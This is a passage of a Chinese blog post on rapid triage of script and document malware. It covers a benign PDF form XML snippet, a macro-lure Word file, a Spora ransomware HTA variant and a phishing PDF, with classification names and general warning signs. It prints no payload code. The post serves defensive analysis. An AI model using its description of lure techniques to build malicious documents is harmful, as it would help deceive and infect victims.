<span class="tag">&lt;<span class="name">linearized</span>&gt;</span>1<span class="tag">&lt;/<span class="name">linearized</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">pdf</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xdp</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">packets</span>&gt;</span>*<span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">xdp</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">destination</span>&gt;</span>pdf<span class="tag">&lt;/<span class="name">destination</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">present</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">baseProfile</span>=<span class="string">&quot;interactiveForms&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.xfa.org/schema/xfa-template/2.4/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subform</span> <span class="attr">name</span>=<span class="string">&quot;topmostSubform&quot;</span> <span class="attr">layout</span>=<span class="string">&quot;tb&quot;</span> <span class="attr">locale</span>=<span class="string">&quot;en_US&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pageSet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pageArea</span> <span class="attr">id</span>=<span class="string">&quot;PageArea1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PageArea1&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentArea</span> <span class="attr">name</span>=<span class="string">&quot;ContentArea1&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0pt&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0pt&quot;</span> <span class="attr">w</span>=<span class="string">&quot;612pt&quot;</span> <span class="attr">h</span>=<span class="string">&quot;792pt&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">medium</span> <span class="attr">short</span>=<span class="string">&quot;612pt&quot;</span> <span class="attr">long</span>=<span class="string">&quot;792pt&quot;</span> <span class="attr">stock</span>=<span class="string">&quot;custom&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pageArea</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">pageSet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">subform</span> <span class="attr">name</span>=<span class="string">&quot;Page1&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0pt&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0pt&quot;</span> <span class="attr">w</span>=<span class="string">&quot;612pt&quot;</span> <span class="attr">h</span>=<span class="string">&quot;792pt&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">break</span> <span class="attr">before</span>=<span class="string">&quot;pageArea&quot;</span> <span class="attr">beforeTarget</span>=<span class="string">&quot;#PageArea1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bind</span> <span class="attr">match</span>=<span class="string">&quot;none&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;ImageField1&quot;</span> <span class="attr">w</span>=<span class="string">&quot;28.575mm&quot;</span> <span class="attr">h</span>=<span class="string">&quot;1.39mm&quot;</span> <span class="attr">x</span>=<span class="string">&quot;37.883mm&quot;</span> <span class="attr">y</span>=<span class="string">&quot;29.25mm&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>是一个用XML格式编写的文档，主要描述了交互式PDF表单的结构和属性配置，不是恶意程序。</p>
+<h4 id="6-be9db1d1260eaa1387c900736282e1b"><a href="#6-be9db1d1260eaa1387c900736282e1b" class="headerlink" title="(6) be9db1d1260eaa1387c900736282e1b"></a>(6) be9db1d1260eaa1387c900736282e1b</h4><p>程序前面都是乱码，直接拉倒最下面发现Microsoft Office Word字样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221602845.png" alt="image-20240322160207793"></p>
+<p>一般来说，Word文档类的恶意程序以内置宏代码的下载者文件居多，各个杀软厂家都会有自己的解密工具来将宏代码提取出来，第三方也有一些比较好用的工具来实现这样的功能。或者我们直接利用hiew也可以找到宏代码，但是比较麻烦，也不直观。但是我们这里并不需要对样本进行详细分析，而是快速判断，所以不妨将文件的后缀，也就是.doc加上，尝试运行一下。</p>
+<p>打开后发现Office软件已经自动将宏禁用了，并且文件会诱导打开宏。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221605881.png" alt="image-20240322160533818"></p>
+<p>可以知道，这是一个恶意文件。可以将其命名为：Trojan.MSWord.Agent.a。</p>
+<h4 id="7-bf39b54e9592bd06cc3ce985508cd2ab"><a href="#7-bf39b54e9592bd06cc3ce985508cd2ab" class="headerlink" title="(7)bf39b54e9592bd06cc3ce985508cd2ab"></a>(7)bf39b54e9592bd06cc3ce985508cd2ab</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221606972.png" alt="image-20240322160623911"></p>
+<p>同样是HTA文件，后面是Base64加密后的部分，处理方式同样本(1)将后缀改为hta打开文件。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221608886.png" alt="image-20240322160839786"></p>
+<p>发现是一个未知的安装程序</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221609551.png" alt="image-20240322160906500"></p>
+<p>它其实就是我们最开始分析的那个样本的变种，因此可以将其命名为：Trojan-Ransom.HTA.Spora.b。</p>
+<h4 id="8-ee4cd7bd35edfd706817b8cc79555783"><a href="#8-ee4cd7bd35edfd706817b8cc79555783" class="headerlink" title="(8) ee4cd7bd35edfd706817b8cc79555783"></a>(8) ee4cd7bd35edfd706817b8cc79555783</h4><p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202403221609676.png" alt="image-20240322160959612"></p>
+<p>pdf类型，同样有乱码，分析方法同(3)，将后缀改为pdf打开看一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/SlientRainyDay/image@main/image/202404111455577.png" alt="202403221612207"></p>
+<p>是一个很模糊的界面，但是鼠标光标有点击的反应，点击会跳转到另一个界面，可以判定为是恶意程序。</p>
+<p>很多时候，恶意程序的作者就是利用一些公司的后勤或者财务人员的薄弱的安全意识进行攻击的，诱惑这些人员只有点击了这个图片才可以获取到这个文档。所以我们可以将这个网址加入到杀毒软件的数据库，从而实现拉黑。</p>
+<p>可以将这个文件命名为：Trojan.PDF.Phish.b。</p>
+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>脚本类和文档类恶意程序的快速识别及归类命名至此就学习完成了，一般该类恶意程序有如下特征：</p>
+<ul>
+<li>乱码</li>
+<li>诱导性操作，如输入账号密码，点击链接等</li>
+<li>异于正常程序的写法</li>
+</ul>
+<p>分析经验丰富之后，如果第一眼感觉该程序不像好东西，那大概率就是恶意程序了！</p>
+<p>下一篇分析PE类恶意程序。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>看雪《恶意程序分析与高级对抗》</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/01/22/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%90%E2%80%94%E8%84%9A%E6%9C%AC%E7%B1%BB%E5%92%8C%E6%96%87%E6%A1%A3%E7%B1%BB/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7/" rel="tag">恶意程序分析技巧</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2024/03/02/picgo%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            picgo图片链接解析问题
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2024/01/11/STL%E5%AD%A6%E4%B9%A0-1/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">stl学习-1</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2024
+        <i class="ri-heart-fill heart_icon"></i> Rain&#39;s Blog
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Rain&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
